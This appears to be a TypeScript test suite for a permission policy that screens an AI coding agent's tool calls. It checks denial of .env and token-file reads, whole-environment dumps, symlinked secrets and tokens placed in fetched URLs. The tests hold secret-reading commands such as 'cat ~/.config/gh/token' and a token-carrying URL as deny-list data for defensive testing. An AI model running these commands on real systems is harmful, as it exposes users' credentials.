import assert from "node:assert/strict";
import { mkdtemp, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import test from "node:test";

import { credentialsFilePath, decideToolUse, isReadOnlyTool } from "./tool-policy.ts";

const cwd = "/tmp/project";

test("the read-only allow list stays exactly the five specified tools", () => {
  for (const tool of ["Read", "Glob", "Grep", "WebSearch", "WebFetch"]) {
    assert.equal(isReadOnlyTool(tool), true, tool);
  }
  for (const tool of ["Bash", "Write", "Edit", "NotebookEdit", "Task", "Skill"]) {
    assert.equal(isReadOnlyTool(tool), false, tool);
  }
});

test("hard-denies explicit secret paths without blocking ordinary Claude files", async () => {
  const deny = async (input: Record<string, unknown>, toolName = "Read") =>
    (await decideToolUse({ toolName, input, cwd })).behavior;

  assert.equal(await deny({ file_path: ".env" }), "deny");
  assert.equal(await deny({ file_path: ".env.local" }), "deny");
  assert.equal(await deny({ pattern: "**/.env.*" }, "Glob"), "deny");
  assert.equal(await deny({ command: "cat .env" }, "Bash"), "deny");
  assert.equal(await deny({ command: `node -e 'open(".env.local")'` }, "Bash"), "deny");
  assert.equal(await deny({ file_path: credentialsFilePath() }), "deny");
  assert.equal(await deny({ file_path: `${process.env.HOME}/.claude/CLAUDE.md` }), "allow");
  assert.equal(await deny({ file_path: ".envrc" }), "allow");
});

test("a Bash command only counts as reading when the name sits in a read position", async (t) => {
  const behavior = async (command: string) =>
    (await decideToolUse({ toolName: "Bash", input: { command }, cwd })).behavior;

  // 读取：拒绝。
  assert.equal(await behavior("cat .env"), "deny");
  assert.equal(await behavior("head -n 5 config/.env.local"), "deny");
  assert.equal(await behavior("ls && source .env"), "deny");
  assert.equal(await behavior("while read line < .env; do echo $line; done"), "deny");
  assert.equal(await behavior("cat ~/.config/gh/token"), "deny");

  // 只是提到名字：放行。这些都不会把内容取出来。
  assert.equal(await behavior(`git commit -m "ignore .env"`), "ask");
  assert.equal(await behavior(`echo ".env" >> .gitignore`), "ask");
  assert.equal(await behavior(`grep -n "^\\.env" .gitignore`), "ask");
  assert.equal(
    await behavior("cat > docs/note.md <<'EOF'\n任意目录下的 .env 文件一律拒绝。\nEOF"),
    "ask",
  );

  t.diagnostic("护栏只防手滑，不防有意规避。");
});

test("hard-denies a Bash command that dumps the whole environment", async () => {
  const behavior = async (command: string) =>
    (await decideToolUse({ toolName: "Bash", input: { command }, cwd })).behavior;

  // 整个环境打印出来：令牌也在里面，拒绝。
  assert.equal(await behavior("env"), "deny");
  assert.equal(await behavior("env | sort"), "deny");
  assert.equal(await behavior("env -0 > vars.txt"), "deny");
  assert.equal(await behavior("cd app && FOO=1 env"), "deny");
  assert.equal(await behavior("printenv"), "deny");
  assert.equal(await behavior("sudo printenv"), "deny");
  assert.equal(await behavior("export"), "deny");
  assert.equal(await behavior("export -p"), "deny");
  assert.equal(await behavior("declare -px"), "deny");
  assert.equal(await behavior("set"), "deny");

  // 借 env 运行别的程序、按名字取单个变量、只改选项：不是整体打印。
  assert.equal(await behavior("env NODE_ENV=test npm test"), "ask");
  assert.equal(await behavior("env -u FOO node app.js"), "ask");
  assert.equal(await behavior("printenv PATH"), "ask");
  assert.equal(await behavior("export FOO=1"), "ask");
  assert.equal(await behavior("declare -A map"), "ask");
  assert.equal(await behavior("set -euo pipefail"), "ask");
  assert.equal(await behavior(`echo "env"`), "ask");
});

test("hard-denies a harmlessly named symlink whose real target is an env file", async (t) => {
  const root = await mkdtemp(path.join(tmpdir(), "remote-policy-"));
  t.after(() => rm(root, { recursive: true, force: true }));
  await writeFile(path.join(root, ".env.test"), "test-only\n", "utf8");
  await symlink(path.join(root, ".env.test"), path.join(root, "ordinary-name"));

  const decision = await decideToolUse({
    toolName: "Read",
    input: { file_path: "ordinary-name" },
    cwd: root,
  });
  assert.equal(decision.behavior, "deny");
});

test("hard-denies an actual configured token in tool input", async () => {
  const previous = process.env.ACCESS_TOKEN;
  process.env.ACCESS_TOKEN = "test-token-that-must-never-reach-a-tool";
  try {
    const decision = await decideToolUse({
      toolName: "WebFetch",
      input: { url: `https://example.invalid/?token=${process.env.ACCESS_TOKEN}` },
      cwd,
    });
    assert.equal(decision.behavior, "deny");
  } finally {
    if (previous === undefined) delete process.env.ACCESS_TOKEN;
    else process.env.ACCESS_TOKEN = previous;
  }
});

test("everything else is pushed to the browser for a per-call decision", async () => {
  for (const toolName of ["Bash", "Write", "Edit"]) {
    const decision = await decideToolUse({
      toolName,
      input: { command: "ls" },
      cwd,
    });
    assert.equal(decision.behavior, "ask", toolName);
  }
});
